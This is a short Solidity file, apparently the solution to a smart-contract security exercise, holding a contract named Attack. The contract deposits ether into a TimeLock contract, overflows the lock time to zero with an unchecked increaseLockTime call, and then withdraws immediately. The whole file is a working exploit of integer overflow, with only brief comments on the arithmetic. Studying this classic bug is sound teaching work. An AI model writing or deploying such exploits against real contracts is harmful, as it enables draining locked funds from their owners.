// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {ITimeLock} from "./ITimeLock.sol";

contract Attack {
    ITimeLock public timelock;

    constructor(address _timelock) {
        timelock = ITimeLock(_timelock);
    }

    fallback() external payable {}

    receive() external payable {}

    function attack() public payable {
        timelock.deposit{value: msg.value}(); 

        // x + t = 2**256 = 0
        // x = 2**256 - t
        // 2**256 = type(uint256).max + 1
        // x = type(uint256).max +  1 - t

        unchecked {
            timelock.increaseLockTime(type(uint256).max + 1 - timelock.getLockTime());
        }
        
        

        

        timelock.withdraw();

    }
}